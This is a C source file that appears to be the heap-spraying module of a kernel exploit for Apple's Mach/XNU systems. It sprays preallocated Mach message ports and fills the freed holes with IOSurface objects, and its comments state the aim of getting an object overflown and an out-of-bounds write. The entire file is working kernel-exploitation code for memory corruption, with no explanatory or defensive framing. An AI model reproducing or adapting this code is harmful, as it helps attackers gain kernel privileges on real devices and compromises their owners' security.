#include "heap_spray.h"
#include "log.h"
#include "iosurface_utils.h"

#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_port.h>
#include <mach/mach_time.h>
#include <mach/mach_traps.h>
#include <mach/port.h>

#define SIZE_TO_ALLOCATE							(0x40001)

static io_connect_t g_surface_conn = 0;
static mach_port_t g_msg_ports[NUMBER_OF_OBJECTS_TO_SPRAY] = {0};
static uint32_t g_surface_ids[NUMBER_OF_SURFACES_TO_SPRAY] = {0};


/*
 * Function name: 	heap_spray_alloc_object_to_be_overwriten
 * Description:		Allocates a preallocated msg which should eventually be overflown.
 * Returns:			kern_return_t.
 */

static
kern_return_t heap_spray_alloc_object_to_be_overwriten(size_t size, mach_port_t * msg_port) {
	
	kern_return_t ret = KERN_SUCCESS;

	mach_port_qos_t qos = {
		.prealloc = 1,
		.len = size
	};

	mach_port_name_t name = MACH_PORT_NULL;

	ret = mach_port_allocate_full(mach_task_self(),
		MACH_PORT_RIGHT_RECEIVE,
		MACH_PORT_NULL,
		&qos,
		&name);

	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("preallocated port allocation failed");
		goto cleanup;
	}

	*msg_port = name;

cleanup:
	return ret;
}


/*
 * Function name: 	heap_spray_fill_heap
 * Description:		Fills the heap with objects that should be overwritten.
 *					The caller is responsible for cleaning up g_msg_ports in case of failure.
 * Returns:			kern_return_t.
 */

static
kern_return_t heap_spray_fill_heap() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint32_t i = 0;

	for(i = 0; i < NUMBER_OF_OBJECTS_TO_SPRAY; ++i) {
		ret = heap_spray_alloc_object_to_be_overwriten(SIZE_TO_ALLOCATE, &(g_msg_ports[i]));
		if (KERN_SUCCESS != ret)
		{
			ERROR_LOG("Error spraying preallocated message %d", i);
			goto cleanup;
		}
	}

cleanup:
	return ret;
}

/*
 * Function name: 	heap_spray_fill_heap_with_surfaces
 * Description:		Fills the holes we created with surfaces that will give us OOB write.
 *					The caller is responsible for cleaning up g_surface_ids in case of failure.
 * Returns:			kern_return_t.
 */

static
kern_return_t heap_spray_fill_heap_with_surfaces() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint32_t i = 0;
	char surface_data[IOSURFACE_DICTIONARY_SIZE] = {0};

	/* Allocate surfaces to fill the holes in the previously freed objects */
	for(i = 0; i < NUMBER_OF_SURFACES_TO_SPRAY; ++i) {
		ret = iosurface_utils_create_surface(g_surface_conn, &(g_surface_ids[i]), surface_data);
		if (KERN_SUCCESS != ret)
		{
			ERROR_LOG("Error spraying surface %d", i);
			goto cleanup;
		}
		memset(*(void**)(surface_data), 1, *(unsigned int*)(surface_data+0x14));
	}

cleanup:
	return ret;
}


/*
 * Function name: 	heap_spray_deallocate_sprayed_objects
 * Description:		Deallocate any objects meant to be used for heap manipulation.
 * Returns:			void.
 */

static
void heap_spray_deallocate_sprayed_objects() {
	
	uint32_t i = 0;

	for(i = 0; i < NUMBER_OF_OBJECTS_TO_SPRAY; i++) {
		if (g_msg_ports[i])
		{
			mach_port_destroy(mach_task_self(), g_msg_ports[i]);
			g_msg_ports[i] = 0;
		}
	}

	for(i = 0; i < NUMBER_OF_SURFACES_TO_SPRAY; ++i) {
		if (g_surface_ids[i])
		{
			iosurface_utils_release_surface(g_surface_conn, g_surface_ids[i]);
			g_surface_ids[i] = 0;
		}
	}
}




/*
 * Function name: 	heap_spray_start_spraying
 * Description:		Starts spraying.
 * Returns:			kern_return_t.
 */

kern_return_t heap_spray_start_spraying() {
	
	kern_return_t ret = KERN_SUCCESS;

	ret = heap_spray_fill_heap();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error filling heap");
		goto cleanup;
	}

	ret = heap_spray_fill_heap_with_surfaces();
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error filling holes with surfaces");
		goto cleanup;
	}

cleanup:
	if (ret)
	{
		heap_spray_deallocate_sprayed_objects();
	}

	return ret;
}


/*
 * Function name: 	heap_spray_cleanup
 * Description:		Cleans up any resource used by the heap spraying module.
 * Returns:			void.
 */

void heap_spray_cleanup() {
	
	heap_spray_deallocate_sprayed_objects();
	if (g_surface_conn)
	{
		IOServiceClose(g_surface_conn);
		g_surface_conn = 0;
	}
}

/*
 * Function name: 	heap_spray_get_sprayed_preallocated_msg
 * Description:		Gets the port of the preallocated message sprayed at a psecified index.
 * Returns:			mach_port_t.
 */

mach_port_t heap_spray_get_sprayed_preallocated_msg(uint32_t index) {

	kern_return_t ret = KERN_SUCCESS;

	if (index >= NUMBER_OF_OBJECTS_TO_SPRAY)
	{
		ERROR_LOG("invalid index requested");
		return 0;
	}

	return g_msg_ports[index];
}




/*
 * Function name: 	heap_spray_get_sprayed_surface_id
 * Description:		Gets the ID of the surface sprayed at a specified index.
 * Returns:			uint32_t as the surface id.
 */

uint32_t heap_spray_get_sprayed_surface_id(uint32_t index) {

	kern_return_t ret = KERN_SUCCESS;
	if (index >= NUMBER_OF_SURFACES_TO_SPRAY)
	{
		ERROR_LOG("invalid index requested");
		return 0;
	}

	return g_surface_ids[index];
}



/*
 * Function name: 	heap_spray_init
 * Description:		Initializes heap spray mechanisms.
 * Returns:			kern_return_t.
 */

kern_return_t heap_spray_init() {
	
	kern_return_t ret = KERN_SUCCESS;

	ret = iosurface_utils_get_connection(&g_surface_conn);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing connection to IOSurfaceRoot");
		goto cleanup;
	}

cleanup:
	if (ret)
	{
		if (g_surface_conn)
		{
			IOServiceClose(g_surface_conn);
			g_surface_conn = 0;
		}
	}
	return ret;
}